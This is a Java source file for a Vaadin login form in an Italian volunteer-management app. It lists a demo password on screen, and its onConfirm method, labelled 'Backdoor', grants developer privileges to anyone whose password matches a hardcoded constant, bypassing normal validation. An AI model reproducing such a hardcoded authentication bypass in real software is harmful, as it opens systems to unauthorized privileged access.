package it.algos.wam.login;

import com.vaadin.addon.jpacontainer.JPAContainer;
import com.vaadin.addon.jpacontainer.fieldfactory.SingleSelectConverter;
import com.vaadin.data.Container;
import com.vaadin.data.Property;
import com.vaadin.data.util.filter.Compare;
import com.vaadin.ui.ComboBox;
import com.vaadin.ui.Component;
import com.vaadin.ui.Label;
import com.vaadin.ui.Notification;
import it.algos.wam.WAMApp;
import it.algos.wam.entity.iscrizione.Iscrizione_;
import it.algos.wam.entity.volontario.Volontario;
import it.algos.wam.entity.volontario.Volontario_;
import it.algos.wam.entity.wamcompany.WamCompany;
import it.algos.wam.ui.WamUI;
import it.algos.webbase.domain.company.BaseCompany;
import it.algos.webbase.domain.utente.Utente;
import it.algos.webbase.multiazienda.CompanyQuery;
import it.algos.webbase.multiazienda.CompanySessionLib;
import it.algos.webbase.multiazienda.ERelatedComboField;
import it.algos.webbase.web.entity.EM;
import it.algos.webbase.web.field.FieldAlignment;
import it.algos.webbase.web.field.FieldInterface;
import it.algos.webbase.web.lib.Lib;
import it.algos.webbase.web.lib.LibSession;
import it.algos.webbase.web.login.DefaultLoginForm;
import it.algos.webbase.web.login.UserIF;
import it.algos.webbase.web.query.AQuery;

import java.util.ArrayList;
import java.util.Collection;
import java.util.List;

/**
 * Created by alex on 25-05-2016.
 * .
 */
public class WamLoginForm extends DefaultLoginForm {

    private UserIF user;
    private ComboBox userCombo;

    @Override
    protected void init() {
        super.init();
        WamCompany company = (WamCompany) CompanySessionLib.getCompany();
        if (company != null) {
            if (company.getCompanyCode().equals(WAMApp.DEMO_COMPANY_CODE)) {
                addComponent(new Label("Password per Volontario = volontario"));
            }// end of if cycle
        }// end of if cycle
    }


    public Component createUsernameComponent() {
        Collection<Volontario> options = Volontario.getListIsAbilitato();

        userCombo = new ComboBox("Utente",options);
        userCombo.addValueChangeListener(new Property.ValueChangeListener() {
            @Override
            public void valueChange(Property.ValueChangeEvent valueChangeEvent) {
                getPassField().clear();
            }
        });

        return userCombo;
    }// end of method

    protected void onConfirm2() {
        UserIF user = getSelectedUser();
        if (user != null) {
            String password = getPassField().getValue();
            if (user.validatePassword(password)) {
                super.onConfirm();
                utenteLoggato();
            } else {
                Notification.show("Login fallito", Notification.Type.WARNING_MESSAGE);
            }
        }
    }// end of method


    @Override
    public void setUsername(String name) {
        Volontario v = Volontario.queryByNick(name);
        if (v != null) {
            userCombo.setValue(v.getId());
        } else {
            userCombo.setValue(null);
        }// end of if/else cycle
    }// end of method


    @Override
    /**
     * @return the selected user
     */
    public UserIF getSelectedUser() {
        UserIF user = null;

        if (this.user != null) {
            user = this.user;
        } else {
            Object obj = userCombo.getValue();
            if (obj != null) {
                if (obj instanceof UserIF) {
                    user = (UserIF) obj;
                }
            }
        }
        return user;
    }// end of method

    /**
     * Created by gac on 8-8-2016.
     * Backdoor
     */
    @Override
    protected void onConfirm() {
        String password = getPassField().getValue();
        if (password.equals(WamUI.BACKDOOR)) {
            user = new Utente("developer", password);
            LibSession.setDeveloper(true);
            super.onConfirm();
        } else {
            LibSession.setDeveloper(false);
            super.onConfirm();
        }
    }// end of method


}// end of class
